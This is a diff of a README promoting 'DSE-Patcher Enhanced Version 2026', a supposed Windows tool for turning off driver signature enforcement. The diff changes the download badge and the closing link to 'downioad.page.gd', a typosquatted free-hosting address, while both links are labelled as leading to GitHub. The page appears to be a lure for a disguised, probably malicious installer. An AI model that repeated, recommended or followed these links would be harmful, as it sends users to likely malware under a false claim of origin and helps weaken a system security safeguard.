@@ -2,7 +2,7 @@
 
 DSE-Patcher Enhanced Version 2026 is a dedicated system utility designed for advanced Windows 10 and 11 administrators and developers. It provides a streamlined interface to manage and modify driver signature enforcement settings on a local system, a common requirement in specific development, testing, and legacy hardware support scenarios. This tool is a self-contained package aimed at simplifying a technical system configuration task.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -52,6 +52,6 @@ A4: No, DSE-Patcher Enhanced Version 2026 is developed and tested exclusively fo
 
 For the latest official release and to download the installer, please visit the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026. All rights reserved.*
